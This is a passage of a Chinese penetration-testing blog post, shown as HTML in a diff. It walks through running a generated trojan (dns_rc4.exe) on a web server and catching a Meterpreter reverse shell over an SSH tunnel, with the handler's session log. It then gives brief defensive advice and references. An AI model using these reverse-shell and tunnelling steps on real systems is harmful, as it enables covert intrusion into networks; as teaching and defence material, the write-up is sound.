+tcp6       0      0 :::443                  :::*                    LISTEN      - 
+</code></pre></td></tr></table>
+</div>
+</div><p>最后我们把生成的木马<code>dns_rc4.exe</code>放在Web服务器上执行，就可以看到msf反弹回来一个shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 172.16.0.107:53 
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175178</span> bytes<span class="o">)</span> to 172.16.0.107
+<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">51</span> opened <span class="o">(</span>172.16.0.107:53 -&gt; 172.16.0.107:42804 <span class="o">)</span> at 2022-02-10 15:13:17 +0800
+
+meterpreter &gt; ifconfig
+
+Interface  <span class="nv">1</span>
+<span class="o">============</span>
+Name         : Software Loopback Interface <span class="m">1</span>
+Hardware MAC : 00:00:00:00:00:00
+MTU          : <span class="m">4294967295</span>
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface <span class="nv">11</span>
+<span class="o">============</span>
+Name         : Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Network Connection
+Hardware MAC : 00:0c:29:ad:5b:f3
+MTU          : <span class="m">1500</span>
+IPv4 Address : 172.16.0.105
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::7d95:97e1:6b19:c934
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到全程是走ssh加密协议的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/6.png" alt="6"></p>
+<h2 id="0x03-防御ssh隧道攻击">0x03 防御SSH隧道攻击</h2>
+<p>在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p>
+<h2 id="0x04-参考">0x04 参考</h2>
+<p><a href="https://xz.aliyun.com/t/7956">https://xz.aliyun.com/t/7956</a></p>
+<p><a href="https://www.c0bra.xyz/2019/10/17/%E5%88%A9%E7%94%A8ssh%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/">https://www.c0bra.xyz/2019/10/17/%E5%88%A9%E7%94%A8ssh%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</a></p>
+<p><a href="https://xz.aliyun.com/t/7245">https://xz.aliyun.com/t/7245</a></p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">F0rmat</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2022-02-10
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/llmnr_nbt-ns/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">LLMNR/NBT-NS欺骗攻击</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/windows_set_ip_access/">
+            <span class="next-text nav-default">Windows设置指定IP远程访问3389</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="https://github.com/Secd0g/" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://www.zhihu.com/people/F0rmat" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://xxe.icu/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2017 -
+    2022
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        F0rmat
+        
+      </span></span>
+
+  
+  
+    <span id="busuanzi_container">
+      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
